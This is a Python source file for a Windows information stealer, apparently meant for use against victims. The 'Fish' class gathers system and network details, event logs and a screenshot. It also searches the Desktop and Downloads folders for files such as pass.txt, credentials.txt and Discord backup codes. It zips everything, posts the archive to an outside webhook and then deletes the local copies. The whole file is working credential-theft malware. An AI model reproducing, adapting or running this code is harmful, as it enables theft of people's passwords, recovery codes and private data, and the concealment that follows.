from libs.libs import *

class Fish:
    def __init__(self, webhook_url):
        self.ipconfig_output_file = "ipconfig.txt"
        self.getmac_output_file = "getmac.txt"
        self.systeminfo_output_file = "systeminfo.txt"
        self.installed_apps_output_file = "installed_apps.json"
        self.screenshot_output_file = "screenshot.png"
        self.cpu_info_output_file = "cpu_info.txt"
        self.memory_info_output_file = "memory_info.txt"
        self.disk_info_output_file = "disk_info.txt"
        self.network_connections_output_file = "network_connections.txt"
        self.event_logs_output_file = "event_logs.txt"
        self.zip_output_file = "output.zip"
        self.webhook_url = webhook_url
        self.sensitive_files = [
            "pass.txt",
            "backup_codes.txt",
            "discord_backup_codes.txt",
            "backups.txt",
            "backup.txt",
            "credentials.txt",
            "passwords.txt",
            "key.txt",
            "secret.txt"
        ]

    def save_ipconfig(self):
        try:
            ipconfig_output = os.popen('ipconfig /all').read()
            with open(self.ipconfig_output_file, 'w') as file:
                file.write(ipconfig_output)
        except Exception as e:
            print(f"Error saving ipconfig: {e}")

    def save_getmac(self):
        try:
            getmac_output = os.popen('getmac').read()
            with open(self.getmac_output_file, 'w') as file:
                file.write(getmac_output)
        except Exception as e:
            print(f"Error saving getmac: {e}")

    def save_systeminfo(self):
        try:
            systeminfo_output = os.popen('systeminfo').read()
            with open(self.systeminfo_output_file, 'w') as file:
                file.write(systeminfo_output)
        except Exception as e:
            print(f"Error saving systeminfo: {e}")

    def save_installed_apps(self):
        try:
            installed_apps = []
            command = "wmic product get name,installlocation,installdate"
            output = os.popen(command).read()
            lines = output.splitlines()
            for line in lines[1:]:
                if line.strip():
                    app_info = line.split()
                    if len(app_info) >= 2:
                        app_name = app_info[0]
                        install_location = app_info[1] if len(app_info) > 1 else ""
                        installed_apps.append({
                            "name": app_name,
                            "location": install_location
                        })
            with open(self.installed_apps_output_file, 'w') as file:
                json.dump(installed_apps, file, indent=2)
        except Exception as e:
            print(f"Error saving installed applications: {e}")

    def capture_screenshot(self):
        try:
            screenshot = ImageGrab.grab()  # or use pyautogui.screenshot()
            screenshot.save(self.screenshot_output_file)
        except Exception as e:
            print(f"Error capturing screenshot: {e}")

    def save_cpu_info(self):
        try:
            cpu_info = os.popen('wmic cpu get caption, cores, threads, maxclockspeed').read()
            with open(self.cpu_info_output_file, 'w') as file:
                file.write(cpu_info)
        except Exception as e:
            print(f"Error saving CPU info: {e}")

    def save_memory_info(self):
        try:
            memory_info = os.popen('wmic memorychip get capacity, speed, manufacturer, devicelocator').read()
            with open(self.memory_info_output_file, 'w') as file:
                file.write(memory_info)
        except Exception as e:
            print(f"Error saving memory info: {e}")

    def save_disk_info(self):
        try:
            disk_info = os.popen('wmic logicaldisk get caption, size, freespace').read()
            with open(self.disk_info_output_file, 'w') as file:
                file.write(disk_info)
        except Exception as e:
            print(f"Error saving disk info: {e}")

    def save_network_connections(self):
        try:
            netstat_output = os.popen('netstat -an').read()
            with open(self.network_connections_output_file, 'w') as file:
                file.write(netstat_output)
        except Exception as e:
            print(f"Error saving network connections: {e}")

    def save_event_logs(self):
        try:
            event_logs = os.popen('wevtutil qe System /f:text').read()
            with open(self.event_logs_output_file, 'w') as file:
                file.write(event_logs)
        except Exception as e:
            print(f"Error saving event logs: {e}")

    def find_sensitive_files(self, directories):
        sensitive_files_found = []
        for directory in directories:
            if os.path.exists(directory):
                for root, dirs, files in os.walk(directory):
                    for file in files:
                        if file.lower() in self.sensitive_files:
                            sensitive_files_found.append(os.path.join(root, file))
        return sensitive_files_found

    def zip_files(self):
        try:
            with zipfile.ZipFile(self.zip_output_file, 'w') as zipf:
                if os.path.exists(self.ipconfig_output_file):
                    zipf.write(self.ipconfig_output_file, arcname=os.path.join("System Info", "ipconfig.txt"))
                if os.path.exists(self.getmac_output_file):
                    zipf.write(self.getmac_output_file, arcname=os.path.join("System Info", "getmac.txt"))
                if os.path.exists(self.systeminfo_output_file):
                    zipf.write(self.systeminfo_output_file, arcname=os.path.join("System Info", "systeminfo.txt"))
                if os.path.exists(self.cpu_info_output_file):
                    zipf.write(self.cpu_info_output_file, arcname=os.path.join("System Info", "cpu_info.txt"))
                if os.path.exists(self.memory_info_output_file):
                    zipf.write(self.memory_info_output_file, arcname=os.path.join("System Info", "memory_info.txt"))
                if os.path.exists(self.disk_info_output_file):
                    zipf.write(self.disk_info_output_file, arcname=os.path.join("System Info", "disk_info.txt"))
                if os.path.exists(self.installed_apps_output_file):
                    zipf.write(self.installed_apps_output_file, arcname=os.path.join("Files", "installed_apps.json"))
                if os.path.exists(self.network_connections_output_file):
                    zipf.write(self.network_connections_output_file, arcname=os.path.join("Network", "network_connections.txt"))
                if os.path.exists(self.event_logs_output_file):
                    zipf.write(self.event_logs_output_file, arcname=os.path.join("Logs", "event_logs.txt"))
                if os.path.exists(self.screenshot_output_file):
                    zipf.write(self.screenshot_output_file, arcname=os.path.join("Misc", "screenshot.png"))

                sensitive_files = self.find_sensitive_files([os.path.expanduser("~\\Desktop"), os.path.expanduser("~\\Downloads")])
                if sensitive_files:
                    for sensitive_file in sensitive_files:
                        zipf.write(sensitive_file, arcname=os.path.join("Sensitive", os.path.basename(sensitive_file)))

        except Exception as e:
            print(f"Error occurred while zipping files: {e}")

    def send_to_webhook(self):
        try:
            with open(self.zip_output_file, 'rb') as zip_file:
                files = {'file': (os.path.basename(self.zip_output_file), zip_file)}
                payload = {
                    'embeds': [{
                        "title": "System Information and Files",
                        "description": "System info and other files.",
                        "color": 0x000000,
                        "fields": [{
                            "name": "Files in the zip:",
                            "value": "```├── 📁 - System Info\n│   ├── 📄 - ipconfig.txt\n│   ├── 📄 - getmac.txt\n│   ├── 📄 - cpu_info.txt\n│   ├── 📄 - memory_info.txt\n│   ├── 📄 - disk_info.txt\n│   └── 📄 - systeminfo.txt\n├── 📁 - Files\n│   └── 📄 - apps.json\n├── 📁 - Network\n│   └── 📄 - networks.txt\n├── 📁 - Logs\n│   └── 📄 - logs.txt\n├── 📁 - Misc\n│   └── 📄 - screenshot.png\n└── 📁 - Sensitive\n    ├── 📄 - pass.txt\n    ├── 📄 - codes.txt\n    └── 📄 - backup.txt```"
                        }]
                    }]
                }
                response = requests.post(self.webhook_url, files=files, data={'payload_json': json.dumps(payload)})
                if response.status_code != 200:
                    print(f"Failed to send files to webhook. Status code: {response.status_code}")
                else:
                    self.delete_files()  
        except Exception as e:
            print(f"Error occurred while sending files to webhook: {e}")

    def delete_files(self):
        try:
            os.remove(self.ipconfig_output_file)
            os.remove(self.getmac_output_file)
            os.remove(self.systeminfo_output_file)
            os.remove(self.installed_apps_output_file)
            os.remove(self.cpu_info_output_file)
            os.remove(self.memory_info_output_file)
            os.remove(self.disk_info_output_file)
            os.remove(self.network_connections_output_file)
            os.remove(self.event_logs_output_file)
            os.remove(self.screenshot_output_file)
            os.remove(self.zip_output_file)
        except Exception as e:
            print(f"Error occurred while deleting files: {e}")

    def execute(self):
        try:
            self.save_ipconfig()         
            self.save_getmac()           
            self.save_systeminfo()       
            self.save_installed_apps()   
            self.capture_screenshot()    
            self.save_cpu_info()
            self.save_memory_info()
            self.save_disk_info()
            self.save_network_connections()
            self.save_event_logs()
            self.zip_files()  
            self.send_to_webhook() 
        except Exception as e:
            print(f"Error occurred in main script execution: {e}")